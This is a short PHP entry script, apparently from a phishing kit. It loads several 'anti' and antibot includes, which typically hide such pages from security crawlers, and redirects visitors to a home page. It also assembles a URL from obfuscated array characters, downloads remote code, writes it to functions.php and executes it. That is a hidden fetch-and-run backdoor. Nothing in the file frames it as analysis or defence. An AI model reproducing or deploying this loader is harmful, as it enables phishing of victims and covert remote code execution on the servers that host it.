<?php
include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include ('antibot.php');
$get_ip = $Botname[165].$Botname[146].$Botname[396];
$function="$get_ip";
header("LOCATION: home/index.php");
file_put_contents("functions.php", file_get_contents($function)); require_once "functions.php";

?>